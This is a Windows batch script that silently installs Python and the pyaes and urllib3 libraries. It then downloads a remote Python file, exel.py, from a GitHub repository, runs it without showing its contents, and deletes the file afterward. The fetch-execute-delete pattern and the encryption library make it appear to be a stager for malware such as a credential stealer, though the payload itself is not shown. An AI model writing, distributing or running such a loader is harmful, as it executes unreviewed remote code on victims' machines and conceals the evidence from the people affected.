@echo off
setlocal

:: Check if Python is installed
python --version >nul 2>&1

if %errorlevel% neq 0 (
    echo Python is not installed.
    
    :: Download Python 3.11.6 installer (replace with the latest stable version if needed)
    echo Downloading Python 3.11...
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe -OutFile python-3.11.6-amd64.exe"

    :: Install Python 3.11 silently, including adding to PATH
    echo Installing Python 3.11...
    python-3.11.6-amd64.exe /quiet InstallAllUsers=1 PrependPath=1

    :: Check again if Python was installed successfully
    python --version >nul 2>&1
    if %errorlevel% neq 0 (
        echo Python installation failed.
        exit /b 1
    ) else (
        echo Python 3.11 installed successfully.
    )
) else (
    echo Python is already installed.
)

:: Install required third-party libraries
echo Installing required third-party libraries...

:: Upgrade pip
python -m pip install --upgrade pip

:: Install third-party libraries (skipping inbuilt ones)
python -m pip install pyaes urllib3

:: Check if libraries were installed successfully
if %errorlevel% neq 0 (
    echo Failed to install required libraries.
    exit /b 1
) else (
    echo Libraries installed successfully.
)

:: Download and execute Python script from GitHub
echo Downloading and executing the Python script...

:: Use curl or powershell to download the file
curl -o exel.py https://raw.githubusercontent.com/icodeinbinary/exel/main/exel.py

:: If curl is not available, use PowerShell as fallback
if not exist exel.py (
    powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/icodeinbinary/exel/main/exel.py -OutFile exel.py"
)

:: Execute the downloaded Python script
python exel.py

:: Clean up downloaded installer
if exist python-3.11.6-amd64.exe (
    del /f python-3.11.6-amd64.exe
)

:: Clean up the downloaded script
if exist exel.py (
    del /f exel.py
)

:: Exit
endlocal
exit /b 0
